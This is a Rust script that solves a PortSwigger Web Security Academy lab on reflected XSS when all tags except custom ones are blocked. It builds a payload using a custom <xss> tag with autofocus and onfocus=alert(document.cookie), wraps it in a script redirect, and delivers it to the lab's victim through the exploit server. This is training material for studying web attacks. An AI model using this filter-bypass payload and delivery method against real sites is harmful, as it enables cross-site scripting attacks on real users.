/*********************************************************************************
*
* Lab: Reflected XSS into HTML context with all tags blocked except custom ones
*
* Hack Steps: 
*      1. Craft a script that will redirect the victim to the vulnerable
*         website with the injected payload in the search query parameter
*      2. Deliver the exploit to the victim
*      3. The alert() function will be called after they trigger the exploit
*
**********************************************************************************/
use reqwest::{
    blocking::{Client, ClientBuilder},
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a1f006a04a9cb62864e2ad4009200ff.web-security-academy.net";

// Change this to your exploit server URL
const EXPLOIT_SERVER_URL: &str =
    "https://exploit-0ae600c404bbcb1e864229500130008f.exploit-server.net";

fn main() {
    let payload = format!(
        r###"<script>
                location = "{LAB_URL}/?search=<xss autofocus tabindex=1 onfocus=alert(document.cookie)></xss>"
            </script>"###
    );

    print!("❯❯ Delivering the exploit to the victim.. ");
    io::stdout().flush().unwrap();

    deliver_exploit_to_victim(&payload);

    println!("{}", "OK".green());
    println!("🗹 The alert() function will be called after they trigger the exploit");
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn deliver_exploit_to_victim(payload: &str) {
    let response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8";
    let client = build_web_client();
    client
        .post(EXPLOIT_SERVER_URL)
        .form(&HashMap::from([
            ("formAction", "DELIVER_TO_VICTIM"),
            ("urlIsHttps", "on"),
            ("responseFile", "/exploit"),
            ("responseHead", response_head),
            ("responseBody", payload),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to deliver the exploit to the victim".red()
        ));
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::default())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
